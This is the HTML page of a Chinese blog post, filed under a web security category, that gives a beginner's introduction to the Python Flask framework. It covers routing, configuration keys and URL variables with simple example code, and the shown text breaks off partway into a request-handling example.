<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Python-Flask（完善中...） | 晚城的海岸线</title><meta name="author" content="Qu4rt3r77"><meta name="copyright" content="Qu4rt3r77"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Python-Flask初识Flask思考：Flask是Python中的Web应用程序框架，以我的初步理解来看就是能生成web页面，这不得不让我联想到了PHP，同样都是可以生成Web，想必他们一定有很多差异值得探讨。 首先引起我注意的是框架这个字眼，我们暂且用打包这个说法来定义吧，这个框架相当于一个预先编写好的结构，对于Web应用程序它提供了相应的基本功能和组件，这里就有我们所熟知的处理HTTP请">
<meta property="og:type" content="article">
<meta property="og:title" content="Python-Flask（完善中...）">
<meta property="og:url" content="https://quarter77.github.io/undefined/bf39/index.html">
<meta property="og:site_name" content="晚城的海岸线">
<meta property="og:description" content="Python-Flask初识Flask思考：Flask是Python中的Web应用程序框架，以我的初步理解来看就是能生成web页面，这不得不让我联想到了PHP，同样都是可以生成Web，想必他们一定有很多差异值得探讨。 首先引起我注意的是框架这个字眼，我们暂且用打包这个说法来定义吧，这个框架相当于一个预先编写好的结构，对于Web应用程序它提供了相应的基本功能和组件，这里就有我们所熟知的处理HTTP请">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://quarter77.github.io/img/3.jpg">
<meta property="article:published_time" content="2024-04-14T07:14:44.168Z">
<meta property="article:modified_time" content="2024-04-15T05:40:35.074Z">
<meta property="article:author" content="Qu4rt3r77">
<meta property="article:tag" content="Python">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://quarter77.github.io/img/3.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://quarter77.github.io/undefined/bf39/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Qu4rt3r77","link":"链接: ","source":"来源: 晚城的海岸线","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Python-Flask（完善中...）',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-04-15 13:40:35'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/meun_centered.css?1"><link rel="stylesheet" href="/css/bigger.css?1"><link rel="stylesheet" href="/css/fonts.css?1"><meta name="generator" content="Hexo 7.1.1"></head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><script>window.paceOptions = {
  restartOnPushState: false
}

document.addEventListener('pjax:send', () => {
  Pace.restart()
})
</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:randomPost();"><i class="fa-fw fa-solid fa-shuffle"></i><span> 随机访问</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/share/"><i class="fa-fw fa fa-share-alt-square"></i><span> 分享</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fa fa-images"></i><span> 图库</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/3.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="晚城的海岸线"><span class="site-name">晚城的海岸线</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:randomPost();"><i class="fa-fw fa-solid fa-shuffle"></i><span> 随机访问</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/share/"><i class="fa-fw fa fa-share-alt-square"></i><span> 分享</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fa fa-images"></i><span> 图库</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></a></div><!-- 正确的 #toggle-menu 定义--><div class="navbar-toggle" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Python-Flask（完善中...）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-14T07:14:44.168Z" title="发表于 2024-04-14 15:14:44">2024-04-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-15T05:40:35.074Z" title="更新于 2024-04-15 13:40:35">2024-04-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>24分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Python-Flask（完善中...）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Python-Flask"><a href="#Python-Flask" class="headerlink" title="Python-Flask"></a>Python-Flask</h1><h2 id="初识Flask"><a href="#初识Flask" class="headerlink" title="初识Flask"></a>初识Flask</h2><p>思考：Flask是Python中的Web应用程序框架，以我的初步理解来看就是能生成web页面，这不得不让我联想到了PHP，同样都是可以生成Web，想必他们一定有很多差异值得探讨。</p>
<p>首先引起我注意的是框架这个字眼，我们暂且用打包这个说法来定义吧，这个框架相当于一个预先编写好的结构，对于Web应用程序它提供了相应的基本功能和组件，这里就有我们所熟知的<strong>处理HTTP请求、路由URL、渲染模板、管理用户会话等基本功能</strong>。</p>
<p>所以，不难发现，这个flask框架跳过了那些繁琐的构建网页前所需的一些设置，协议，让用户通过这个框架，模板去套，更专注于开发、测试和维护网页。</p>
<h3 id="Flask的内核：Werkzeug-Jinja2"><a href="#Flask的内核：Werkzeug-Jinja2" class="headerlink" title="Flask的内核：Werkzeug&amp;Jinja2"></a>Flask的内核：Werkzeug&amp;Jinja2</h3><p>Werkzeug：Werkzeug是一个WSGI（Web Server Gateway Interface）工具库，<strong>它提供了实现HTTP请求、响应处理、URL路由等功能的核心组件，为Flask提供了底层的HTTP请求处理能力。</strong></p>
<p>Jinja2：Jinja2是一个现代化的模板引擎，它允许开发者使用类似Python的语法来创建动态内容的模板。<strong>Flask使用Jinja2来渲染Web应用程序中的HTML模板，从而让开发者能够动态地生成网页内容。</strong></p>
<p>除了这两个核心组件外，Flask还有许多扩展，可以用于处理表单、数据库集成、身份验证等各种功能。</p>
<p>现在看到了表单、数据库等熟悉的字眼，从宏观上来看大体构建网站思路还是一样的</p>
<h3 id="关于Flask和PHP"><a href="#关于Flask和PHP" class="headerlink" title="关于Flask和PHP"></a>关于Flask和PHP</h3><p>这是基于刚才的思考疑惑，大体上来讲，可能PHP性能上来说要优于Flask，但由于Python拥有大量的库可以支撑，其实这个差异就被弥补了；再者，PHP可以直接用于编写Web应用程序的后端逻辑，而Flask则提供了一种结构化的方式来组织Python代码。总而言之，两者在开发上没啥太大区别，不过多点思考也是好的</p>
<h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--项目名</span><br><span class="line">	|---static	    (静态)</span><br><span class="line">	|---templates	(模板)</span><br><span class="line">	|---app.py		(运行|启动)</span><br></pre></td></tr></table></figure>

<p>Flask启动项目默认为app.py</p>
<h2 id="Flask程序"><a href="#Flask程序" class="headerlink" title="Flask程序"></a>Flask程序</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>我们来看这么一个基本代码，它会在web页面上输出Hello, World!我们来逐行解析一下语法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask：</span><br><span class="line">flask是包名，Flask是模块名</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)：</span><br><span class="line">初始化程序，同时将应用程序实例储存在app变量中</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)：</span></span><br><span class="line">route是路由的意思，这里理解成路径，告诉Flask应用程序当用户访问根URL（<span class="string">&#x27;/&#x27;</span>）时，应该调用下面定义的函数</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">检查当前模块是否是作为主程序执行的。如果是，接下来的代码块会被执行</span><br><span class="line"></span><br><span class="line">app.run(debug=<span class="literal">True</span>)：</span><br><span class="line">启动了Flask应用程序的开发服务器， 默认使用本地地址和<span class="number">5000</span>端口</span><br></pre></td></tr></table></figure>

<h3 id="app-run"><a href="#app-run" class="headerlink" title="app.run()"></a>app.run()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.run(host,port,debug,load_dotenv)</span><br></pre></td></tr></table></figure>

<p>host指定监听主机名；port指定监听端口；debug启用或禁用调试模式。设置为 True会启用调试模式，应用会在代码发生变化时自动重启；</p>
<p><strong>（flask编写的程序和php不一样，每一次变动都需要重启服务器来执行变更，就显得很麻烦，为了应对这种问题，flask中的debug模式可以在不影响服务器运行下，执行更新每一次的变更。）</strong></p>
<p>load_dotenv设置为 True 时，会加载项目根目录下的 .env文件中的环境变量。.env文件通常用来存储应用的配置信息</p>
<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/1.png" alt="image-20240407213912357"></p>
<p>在app.py中，我们可以进行文件的相关配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">DEBUG：如果设置为 True，则启用调试模式。在此模式下，服务器将在代码更改时重新加载自身，并在出现未处理的异常时提供一个有用的调试器</span><br><span class="line"></span><br><span class="line">TESTING：如果设置为 True，则标记应用程序处于测试模式</span><br><span class="line"></span><br><span class="line">PROPAGATE_EXCEPTIONS：如果设置为 True，则告诉 Flask 即使未启用调试，也要传播异常</span><br><span class="line"></span><br><span class="line">SECRET_KEY：用于保持客户端会话安全</span><br><span class="line"></span><br><span class="line">PERMANENT_SESSION_LIFETIME：永久会话的生存期</span><br><span class="line"></span><br><span class="line">USE_X_SENDFILE：如果设置为 True，Flask 将尝试使用 X-Sendfile 标头来触发服务器发送文件</span><br><span class="line"></span><br><span class="line">SERVER_NAME：服务器的名称和端口号。如果未设置，将被猜测</span><br><span class="line"></span><br><span class="line">APPLICATION_ROOT：如果应用程序安装在子 URL 上，可以在此处设置。</span><br><span class="line"></span><br><span class="line">SESSION_COOKIE_NAME：会话 cookie 的名称。</span><br><span class="line"></span><br><span class="line">SESSION_COOKIE_DOMAIN：如果要为会话 cookie 设置域，可以在此处执行</span><br><span class="line"></span><br><span class="line">SESSION_COOKIE_PATH：会话 cookie 的路径</span><br><span class="line"></span><br><span class="line">SESSION_COOKIE_HTTPONLY：如果设置为 True，会将会话 cookie 标记为仅限于 HTTP</span><br><span class="line"></span><br><span class="line">SESSION_COOKIE_SECURE：如果设置为 True，则会将 cookie 标记为安全</span><br><span class="line"></span><br><span class="line">SESSION_COOKIE_SAMESITE：用于将会话 cookie 标记为 SameSite</span><br><span class="line"></span><br><span class="line">SESSION_REFRESH_EACH_REQUEST：如果设置为 True，则会在每个请求时刷新 cookie</span><br><span class="line"></span><br><span class="line">MAX_CONTENT_LENGTH：传入请求的最大内容长度</span><br><span class="line"></span><br><span class="line">SEND_FILE_MAX_AGE_DEFAULT：send_file 方法的默认缓存超时</span><br><span class="line"></span><br><span class="line">TRAP_BAD_REQUEST_ERRORS：如果设置为 True，Flask 将不会忽略来自请求数据解析的异常</span><br><span class="line"></span><br><span class="line">TRAP_HTTP_EXCEPTIONS：如果设置为 True，Flask 将会将某些异常转换为 HTTP 响应</span><br><span class="line"></span><br><span class="line">EXPLAIN_TEMPLATE_LOADING：如果设置为 True，将启用模板加载的解释</span><br><span class="line"></span><br><span class="line">PREFERRED_URL_SCHEME：如果没有 URL 方案可用，应使用的 URL 方案</span><br><span class="line"></span><br><span class="line">TEMPLATES_AUTO_RELOAD：如果设置为 True，模板将在更改时自动重新加载</span><br><span class="line"></span><br><span class="line">MAX_COOKIE_SIZE：会话 cookie 的最大大小（以字节为单位）</span><br></pre></td></tr></table></figure>

<h2 id="route"><a href="#route" class="headerlink" title="route()"></a>route()</h2><p>route后有相应的路径我们可以自定义，同时我们可以为相应的路径些相应的函数有两种等价形式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;yoyoyo&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user</span>():</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;who?&#x27;</span></span><br><span class="line">app.add_url_rule(<span class="string">&#x27;/user&#x27;</span>,view_func=user)//使用函数add_url_rule绑定</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/2.png" alt="image-20240407215010007"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/3.png" alt="image-20240407215018829"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/4.png" alt="image-20240407215030211"></p>
<h3 id="路由的变量规则"><a href="#路由的变量规则" class="headerlink" title="路由的变量规则"></a>路由的变量规则</h3><p>顾名思义给url添加可以传入变量的地方，在route中的路径后面添加标记<value_name></value_name></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;username&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;username:&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(username)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/5.png" alt="image-20240407220203535"></p>
<p>或者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;打&#x27;</span>,<span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;瓦&#x27;</span>,<span class="string">&#x27;c&#x27;</span>:<span class="string">&#x27;吗&#x27;</span>&#125;</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get/&lt;value_name&gt;&#x27;</span></span>)		</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">value_name</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;操作：&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(data.get(value_name))</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/6.png" alt="image-20240407220503899"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/7.png" alt="image-20240407220512703"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/8.png" alt="image-20240407220521622"></p>
<h3 id="Request请求"><a href="#Request请求" class="headerlink" title="Request请求"></a>Request请求</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span 